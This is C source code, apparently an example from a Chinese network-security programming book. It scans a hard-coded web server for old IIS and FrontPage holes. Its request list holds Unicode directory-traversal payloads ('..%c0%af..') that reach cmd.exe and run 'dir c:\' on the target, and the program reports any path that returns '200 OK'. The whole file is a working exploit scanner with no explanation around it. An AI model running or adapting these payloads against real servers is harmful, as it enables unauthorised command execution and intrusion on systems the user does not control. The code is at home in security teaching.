//--------------------------------------------------------------------//
//                作者：刘文涛                                        //
//                书籍：《网络安全编程技术与实例》                    //
//--------------------------------------------------------------------//
#include "stdio.h"
#include "Winsock2.h"
#pragma comment(lib,"WS2_32.lib")
int main()
{
    char WebBuffer[1024];
    char *CGI[10];
    char *DestIP = "192.168.1.3";
    WSADATA wsaData;
    int Result;
    SOCKET WebSocket;
    SOCKADDR_IN DestSockAddr;
    CGI[0] = "/?PageServices";
    CGI[1] = "/_vti_inf.html";
    CGI[2] = "/scripts/..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\\";
    CGI[3] = "/msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\\";
    CGI[4] = "/_vti_bin/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\\";
    CGI[5] = "/_mem_bin/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\\";
    CGI[6] = "/cgi-bin/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\\";
    Result = WSAStartup(MAKEWORD(2, 1), &wsaData);
    if (Result == SOCKET_ERROR)
    {
        printf("WSAStartup failed with error %d\n", Result);
        return 0;
    }
    WebSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (WebSocket < 0)
    {
        printf("socket failed with error %d\n", WSAGetLastError());
        return 0;
    }
    DestSockAddr.sin_family = AF_INET;
    DestSockAddr.sin_port = htons(80);
    DestSockAddr.sin_addr.s_addr = inet_addr(DestIP);
    Result = connect(WebSocket, (struct sockaddr*) &DestSockAddr, sizeof(DestSockAddr));
    if (Result < 0)
    {
        printf("connect failed with error %d\n", WSAGetLastError());
        return 0;
    } 
    else
    {
        printf("%sWWW Server is up.\n", DestIP);
    }
    memset(WebBuffer, 0, 1024);
    int SendLength;
    char Head[1000] = "HEAD / HTTP/1.0\n\n";
    SendLength = send(WebSocket, Head, sizeof(Head), 0);
    if (SendLength < 0)
    {
        printf("send failed with error %d\n", WSAGetLastError());
        return 0;
    }
    int ReceiveLen;
    ReceiveLen = recv(WebSocket, WebBuffer, sizeof(WebBuffer), 0);
    if (ReceiveLen < 0)
    {
        printf("recv failed with error %d\n", WSAGetLastError());
        return 0;
    }
    else
    {
        printf("Server Return:\n");
        printf("%s", WebBuffer);
    }
    for (int j = 0; j <= 6; j++)
    {
        SOCKET GetSocket;
        SOCKADDR_IN addr;
        char GetBuffer[2000];
        memset(GetBuffer, 0, sizeof(GetBuffer));
        char GetUrlName[2000];
        sprintf(GetUrlName, "GET %s HTTP/1.0\n\n", CGI[j]);
        GetSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (WebSocket < 0)
        {
            exit(0);
        }
        addr.sin_family = AF_INET;
        addr.sin_port = htons(80);
        addr.sin_addr.s_addr = inet_addr(DestIP);
        int r = connect(GetSocket, (struct sockaddr*) &addr, sizeof(addr));
        int Timeout = 1000;
        Result = setsockopt(GetSocket, SOL_SOCKET, SO_RCVTIMEO, (char*) &Timeout, sizeof(Timeout));
        if (Result == SOCKET_ERROR)
        {
            printf("setsockopt failed with error %d \n", WSAGetLastError());
            return 0;
        } SendLength = send(GetSocket, GetUrlName, strlen(GetUrlName), 0);
        if (SendLength < 0)
        {
            printf("send failed with error %d\n", WSAGetLastError());
            return 0;
        }
        Result = recv(GetSocket, GetBuffer, sizeof(WebBuffer), 0);
        if (Result == SOCKET_ERROR)
        {
            if (WSAGetLastError() != WSAETIMEDOUT)
            {
                printf("recvfrom failed with error %d \n", WSAGetLastError());
                return 0;
            }
            else
            {
                printf("recv time out.\n");
            }
        }
        printf("number %d\n", j);
        if (strstr(GetBuffer, "200 OK") != NULL)
        {
            printf("Web Server Vulnerability: %s \n", CGI[j]);
        }
        if (closesocket(GetSocket) == SOCKET_ERROR)
        {
            printf("closesocket failed with error %d\n", WSAGetLastError());
            return 0;
        }
    }
    if (closesocket(WebSocket) == SOCKET_ERROR)
    {
        printf("closesocket failed with error %d\n", WSAGetLastError());
        return 0;
    }
    if (WSACleanup() == SOCKET_ERROR)
    {
        printf("WSACleanup failed with error %d\n", WSAGetLastError());
        return 0;
    }
    return 1;
}
